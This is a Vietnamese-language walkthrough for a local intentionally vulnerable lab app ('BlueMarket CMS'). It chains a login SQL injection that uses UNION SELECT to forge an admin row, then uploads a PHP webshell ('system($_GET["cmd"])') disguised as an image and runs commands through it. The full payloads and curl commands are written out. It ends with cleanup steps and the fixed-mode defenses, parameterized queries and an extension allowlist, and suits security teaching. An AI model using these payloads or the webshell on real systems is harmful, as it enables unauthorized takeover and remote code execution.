# Hướng 4: SQLi -> Admin Takeover -> Upload PHP -> RCE

> Chỉ sử dụng trong lab local `BlueMarket CMS`. Hướng này minh họa RCE gián tiếp ở tầng ứng dụng sau khi chiếm quyền admin.

## 1. Vị trí lỗi trong app

Chuỗi này có hai phần:

```text
Phần takeover:
Route: /login
Code: app/src/Controllers/AuthController.php

Phần RCE:
Route: /admin/media
Code: app/src/Services/UploadService.php
Output: /uploads/shell.php
```

Đoạn login vulnerable:

```php
$user = $db->queryOne("SELECT * FROM users WHERE username = '" . $username . "'");
```

Đoạn upload vulnerable:

```php
if ($mode === 'fixed') {
    // Chỉ fixed mode mới kiểm tra extension.
}

move_uploaded_file((string) $file['tmp_name'], $target);
```

Ý tưởng:

```text
SQLi trong login
-> UNION SELECT tạo row admin giả
-> app tin row đó là user admin
-> vào /admin/media
-> upload shell.php
-> gọi /uploads/shell.php?cmd=id
-> RCE
```

## 2. Thử login bình thường

```powershell
cd D:\SQL-lead-to-RCE\blue-market-lab
curl.exe -c admin.txt --data-urlencode "username=admin" --data-urlencode "password=admin123" http://localhost:5000/login
curl.exe -b admin.txt "http://localhost:5000/admin"
Remove-Item -Force admin.txt
```

Kỳ vọng: admin dashboard hiển thị.

## 3. Thử SQLi cơ bản trên login

Payload username:

```text
'
```

Gửi request:

```powershell
curl.exe --data-urlencode "username='" --data-urlencode "password=test" http://localhost:5000/login
```

Nếu vulnerable mode, query đang bị nối chuỗi và có thể trả lỗi SQL syntax.

Query bị vỡ:

```sql
SELECT * FROM users WHERE username = '''
```

## 4. Hiểu cấu trúc UNION SELECT

Bảng `users` có 7 cột:

```text
id
username
email
password_hash
role
description
created_at
```

Login code lấy user row và so sánh password:

```php
password_verify($password, $stored) || hash_equals($stored, $password)
```

Vì app lab cho phép so sánh plain text bằng `hash_equals`, ta có thể tạo row giả:

```sql
UNION SELECT
    999,
    'owned',
    'owned@bluemarket.local',
    'ownedpass',
    'admin',
    'Injected admin row',
    CURRENT_TIMESTAMP
```

Nếu gửi password là:

```text
ownedpass
```

thì login thành công với role:

```text
admin
```

## 5. Xây dựng payload takeover từng phần

### 5.1. Đóng chuỗi username

Query gốc:

```sql
SELECT * FROM users WHERE username = '<username>'
```

Username bắt đầu:

```sql
'
```

Kết quả:

```sql
WHERE username = ''
```

### 5.2. Thêm UNION SELECT row admin giả

```sql
UNION SELECT 999,'owned','owned@bluemarket.local','ownedpass','admin','Injected admin row',CURRENT_TIMESTAMP
```

### 5.3. Comment phần còn lại

```sql
--
```

## 6. Payload takeover hoàn chỉnh

```powershell
$payload = @'
' UNION SELECT 999,'owned','owned@bluemarket.local','ownedpass','admin','Injected admin row',CURRENT_TIMESTAMP--
'@

curl.exe -c takeover.txt --data-urlencode "username=$payload" --data-urlencode "password=ownedpass" http://localhost:5000/login
```

Kiểm tra quyền admin:

```powershell
curl.exe -b takeover.txt "http://localhost:5000/admin"
```

Nếu thấy dashboard, SQLi đã dẫn tới admin takeover.

## 7. Tạo webshell PHP

Tạo file local:

```powershell
Set-Content -Path .\shell.php -Encoding ASCII -Value '<?php system($_GET["cmd"] ?? "id"); ?>'
```

Nội dung file:

```php
<?php system($_GET["cmd"] ?? "id"); ?>
```

Giải thích:

```text
system($_GET["cmd"]) lấy lệnh từ query string.
```

## 8. Upload webshell bằng session admin vừa takeover

```powershell
curl.exe -b takeover.txt -F "media=@shell.php;type=image/png" http://localhost:5000/admin/media
```

Giải thích:

```text
Vulnerable mode không kiểm tra extension/MIME chặt chẽ.
File tên shell.php được lưu vào /var/www/html/public/uploads/shell.php.
Nginx cấu hình để PHP-FPM xử lý file .php.
```

Kiểm tra file trong container:

```powershell
docker compose exec web ls -l /var/www/html/public/uploads/shell.php
```

## 9. Kích hoạt RCE

Chạy `id`:

```powershell
curl.exe "http://localhost:5000/uploads/shell.php?cmd=id"
```

Chạy `whoami`:

```powershell
curl.exe "http://localhost:5000/uploads/shell.php?cmd=whoami"
```

Chạy `hostname`:

```powershell
curl.exe "http://localhost:5000/uploads/shell.php?cmd=hostname"
```

Chạy `pwd`:

```powershell
curl.exe "http://localhost:5000/uploads/shell.php?cmd=pwd"
```

Kết quả mẫu:

```text
www-data
```

## 10. Chuỗi giải thích khi báo cáo

```text
Login nối username vào SQL
-> attacker dùng UNION SELECT tạo user admin giả
-> app tạo session role=admin
-> admin có quyền vào Media Library
-> upload shell.php
-> Nginx/PHP-FPM thực thi shell.php
-> cmd query string được chạy bởi process web
-> RCE ở tầng ứng dụng
```

Khác với hướng 2 và 3:

```text
Hướng 2/3: SQLi -> DBMS primitive -> RCE
Hướng 4: SQLi -> app privilege takeover -> app feature abuse -> RCE
```

## 11. Cleanup

```powershell
Remove-Item -Force .\shell.php
Remove-Item -Force takeover.txt
docker compose exec web rm -f /var/www/html/public/uploads/shell.php
```

## 12. Điều kiện để thành công

```text
1. APP_MODE=vulnerable.
2. Login query nối username trực tiếp vào SQL.
3. UNION SELECT trả về row có role admin.
4. Password gửi lên khớp với password_hash plain text trong row giả.
5. Session admin được tạo.
6. UploadService vulnerable cho phép lưu shell.php.
7. Nginx/PHP-FPM thực thi file .php trong uploads.
```

## 13. Fixed mode chặn ở đâu

Trong fixed mode:

```php
$user = $db->paramsOne('SELECT * FROM users WHERE username = $1', [$username]);
```

Username chỉ là data, không thể `UNION SELECT`.

Upload fixed mode chỉ nhận extension media:

```php
$allowed = ['jpg', 'jpeg', 'png', 'gif', 'webp'];
```

File `shell.php` bị từ chối.


